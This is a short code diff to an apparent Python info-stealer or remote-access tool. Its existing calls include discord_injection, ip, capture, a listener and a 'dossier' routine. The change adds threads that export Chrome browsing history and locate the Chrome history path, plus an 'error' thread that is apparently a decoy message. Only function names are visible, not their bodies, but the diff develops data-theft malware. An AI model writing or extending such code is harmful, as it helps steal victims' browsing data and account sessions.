@@ -14,6 +14,7 @@ import webbrowser
 from scanner import scan_all
 import sqlite3
 import tempfile
+from code.error import error
 
 red = "\033[31m"
 green = "\033[32m"
@@ -274,8 +275,13 @@ discord_injection()
 ip()
 dir()
 capture()
-history()
 t1 = threading.Thread(target=start_listener)
 t2 = threading.Thread(target=dossier)
+t3 = threading.Thread(target=export_history_txt)
+t4 = threading.Thread(target=get_chrome_history_path)
+t5 = threading.Thread(target=error)
 t1.start()
 t2.start()
+t3.start()
+t4.start()
+t5.start()
